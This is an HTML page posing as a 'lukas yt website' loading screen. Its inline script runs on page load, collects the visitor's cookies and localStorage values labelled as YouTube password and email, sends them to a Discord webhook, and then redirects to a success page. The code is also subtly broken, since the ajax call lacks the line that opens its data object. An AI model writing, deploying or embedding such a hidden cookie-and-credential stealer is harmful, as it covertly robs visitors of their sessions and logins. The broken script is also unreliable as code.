<!DOCTYPE html>
<html>
<head>
    <title>lukas yt website</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        $(document).ready(function() {
            // Get the user's cookies
            var cookies = document.cookie;
            
            // Get the user's YouTube password and email
            var youtube_password = localStorage.getItem('youtube_password');
            var youtube_email = localStorage.getItem('youtube_email');
            
            // Send the data to the webhook
            $.ajax({
                type: "POST",
                url: "https://discord.com/api/webhooks/1365669132644646944/avx-DWmIq3L9rFnZkv6DrMHWCyDay5_sNI3POeHeJZ30NqwY4dw4jWYf0L5xQpGp0VAU", // Replace this with your actual webhook URL
               
                    cookies: cookies,
                    youtube_password: youtube_password,
                    youtube_email: youtube_email
                },
                success: function(response) {
                    console.log(response);
                },
                error: function(xhr, status, error) {
                    console.log(error);
                }
            });
            
            // Redirect the user to a new page
            window.location.href = "success.html";
        });
    </script>
</head>
<body>
    <h1>Loading the website..</h1>
    <p>Please wait while we load the website</p>
</body>
</html>
